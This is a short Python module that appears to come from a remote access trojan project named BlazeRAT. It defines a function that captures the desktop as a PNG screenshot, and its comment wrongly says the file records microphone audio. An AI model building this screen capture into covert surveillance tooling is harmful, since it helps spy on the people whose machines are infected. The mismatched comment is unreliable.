#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from io import BytesIO
from pyscreenshot import grab # pip3 install pyscreenshot

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed
    to record audio from a microphone
"""

""" Create desktop screenshot """
def Capture() -> bytes:
    obj = BytesIO()
    grab().save(obj, format="PNG")
    return obj.getvalue()
